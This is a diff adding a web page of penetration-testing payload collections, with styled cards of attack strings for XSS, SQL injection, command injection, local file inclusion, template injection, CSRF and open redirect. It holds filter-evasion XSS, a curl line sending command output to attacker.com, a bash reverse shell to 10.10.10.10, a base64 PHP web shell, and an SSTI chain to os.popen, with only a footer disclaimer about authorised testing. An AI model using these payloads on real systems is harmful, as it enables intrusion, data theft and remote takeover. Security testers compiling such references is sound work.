@@ -1,0 +1,155 @@
+---
+layout: archive
+permalink: /tools/payloads/
+title: "Payloads"
+---
+
+<style>
+.pl-hdr{font-family:'Courier New',monospace;font-size:9px;color:#9fef00;letter-spacing:2.5px;text-transform:uppercase;padding:6px 0;margin:32px 0 2px;border-bottom:1px solid #1e1e1e;}
+.pl-card{background:#0a0a0a;border:1px solid #1e1e1e;border-radius:6px;padding:18px 20px;margin:14px 0;font-family:'Courier New',monospace;}
+.pl-label{font-size:9px;letter-spacing:2px;color:#444;text-transform:uppercase;margin-bottom:8px;}
+.pl-title{font-size:14px;font-weight:700;color:#9fef00;margin:0 0 10px;}
+.pl-code{background:#050505;border:1px solid #1a1a1a;border-left:3px solid #9fef00;border-radius:0 4px 4px 0;padding:10px 14px;font-size:11px;color:#9fef00;white-space:pre-wrap;line-height:1.8;overflow-x:auto;margin:6px 0;}
+.pl-copy{font-size:10px;color:#333;font-style:italic;margin-top:6px;}
+.badge-crit{font-size:9px;font-weight:700;padding:2px 7px;border-radius:3px;background:#3d0000;color:#ff4444;margin-left:8px;}
+.badge-high{font-size:9px;font-weight:700;padding:2px 7px;border-radius:3px;background:#2a1a00;color:#ff9800;margin-left:8px;}
+.badge-med{font-size:9px;font-weight:700;padding:2px 7px;border-radius:3px;background:#1a1800;color:#ffeb3b;margin-left:8px;}
+</style>
+
+<div style="font-family:'Courier New',monospace;font-size:10px;color:#444;letter-spacing:2px;text-transform:uppercase;margin-bottom:22px;">// Payload Collections</div>
+
+<!-- ── XSS ── -->
+<div class="pl-hdr">// Cross-Site Scripting (XSS)</div>
+
+<div class="pl-card">
+  <div class="pl-label">Basic Reflected</div>
+  <div class="pl-title">XSS Starters<span class="badge-high">HIGH</span></div>
+  <div class="pl-code">&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;img src=x onerror=alert(1)&gt;
+&lt;svg onload=alert(1)&gt;
+&lt;body onload=alert(1)&gt;
+&lt;iframe src="javascript:alert(1)"&gt;&lt;/iframe&gt;
+"&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+'&gt;&lt;script&gt;alert(1)&lt;/script&gt;</div>
+</div>
+
+<div class="pl-card">
+  <div class="pl-label">Filter Bypass</div>
+  <div class="pl-title">XSS WAF Evasion<span class="badge-crit">CRITICAL</span></div>
+  <div class="pl-code">&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;
+&lt;script/src=//evil.com/x.js&gt;
+&lt;img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;1&#41;"&gt;
+&lt;svg/onload=alert`1`&gt;
+&lt;details open ontoggle=alert(1)&gt;
+javascript:alert(1)//
+data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;</div>
+</div>
+
+<!-- ── SQL Injection ── -->
+<div class="pl-hdr">// SQL Injection</div>
+
+<div class="pl-card">
+  <div class="pl-label">Error-Based &amp; Union</div>
+  <div class="pl-title">SQLi Starters<span class="badge-crit">CRITICAL</span></div>
+  <div class="pl-code">' OR '1'='1
+' OR 1=1--
+" OR "1"="1
+admin'--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT table_name,NULL FROM information_schema.tables--
+' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--</div>
+</div>
+
+<div class="pl-card">
+  <div class="pl-label">Blind Boolean</div>
+  <div class="pl-title">Blind SQLi Detection<span class="badge-high">HIGH</span></div>
+  <div class="pl-code">' AND 1=1--   (true  → normal response)
+' AND 1=2--   (false → empty/different response)
+' AND SUBSTRING(username,1,1)='a'--
+' AND LENGTH(password)&gt;5--
+' AND ASCII(SUBSTR((SELECT database()),1,1))&gt;64--</div>
+</div>
+
+<!-- ── Command Injection ── -->
+<div class="pl-hdr">// Command Injection</div>
+
+<div class="pl-card">
+  <div class="pl-label">OS Command Injection</div>
+  <div class="pl-title">RCE Payloads<span class="badge-crit">CRITICAL</span></div>
+  <div class="pl-code">; id
+| id
+&amp;&amp; id
+|| id
+`id`
+$(id)
+; cat /etc/passwd
+; ls -la /
+; curl http://attacker.com/$(id)
+; bash -i &gt;&amp; /dev/tcp/10.10.10.10/4444 0&gt;&amp;1</div>
+</div>
+
+<!-- ── LFI ── -->
+<div class="pl-hdr">// Local File Inclusion (LFI)</div>
+
+<div class="pl-card">
+  <div class="pl-label">Path Traversal &amp; Wrappers</div>
+  <div class="pl-title">LFI Payloads<span class="badge-crit">CRITICAL</span></div>
+  <div class="pl-code">../../../etc/passwd
+....//....//....//etc/passwd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+php://filter/convert.base64-encode/resource=index.php
+php://filter/read=string.rot13/resource=index.php
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
+expect://id
+/proc/self/environ
+/var/log/apache2/access.log</div>
+</div>
+
+<!-- ── SSTI ── -->
+<div class="pl-hdr">// Server-Side Template Injection (SSTI)</div>
+
+<div class="pl-card">
+  <div class="pl-label">Detection &amp; Exploitation</div>
+  <div class="pl-title">SSTI Payloads<span class="badge-crit">CRITICAL</span></div>
+  <div class="pl-code">{{7*7}}                         → 49 (Jinja2/Twig)
+${7*7}                          → 49 (Freemarker/Thymeleaf)
+<%= 7*7 %>                      → 49 (ERB/EJS)
+{{config}}                      → Flask config dump
+{{''.__class__.__mro__[1].__subclasses__()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}</div>
+</div>
+
+<!-- ── CSRF ── -->
+<div class="pl-hdr">// CSRF</div>
+
+<div class="pl-card">
+  <div class="pl-label">Auto-Submit PoC</div>
+  <div class="pl-title">CSRF HTML PoC<span class="badge-med">MEDIUM</span></div>
+  <div class="pl-code">&lt;html&gt;
+  &lt;body onload="document.forms[0].submit()"&gt;
+    &lt;form action="https://target.com/change-password" method="POST"&gt;
+      &lt;input type="hidden" name="password" value="hacked123"&gt;
+      &lt;input type="hidden" name="confirm"   value="hacked123"&gt;
+    &lt;/form&gt;
+  &lt;/body&gt;
+&lt;/html&gt;</div>
+</div>
+
+<!-- ── Open Redirect ── -->
+<div class="pl-hdr">// Open Redirect</div>
+
+<div class="pl-card">
+  <div class="pl-label">Bypass Patterns</div>
+  <div class="pl-title">Open Redirect Payloads<span class="badge-med">MEDIUM</span></div>
+  <div class="pl-code">https://target.com/redirect?url=https://evil.com
+https://target.com/redirect?url=//evil.com
+https://target.com/redirect?url=\/\/evil.com
+https://target.com/redirect?url=%2F%2Fevil.com
+https://target.com/redirect?url=https://target.com.evil.com
+https://target.com/redirect?url=javascript:alert(1)</div>
+</div>
+
+<div style="font-family:'Courier New',monospace;font-size:9px;color:#333;letter-spacing:1px;margin-top:40px;padding-top:12px;border-top:1px solid #111;">
+  ⚠ All payloads are for authorised security testing only. Do not use against systems you do not own or have explicit written permission to test.
+</div>
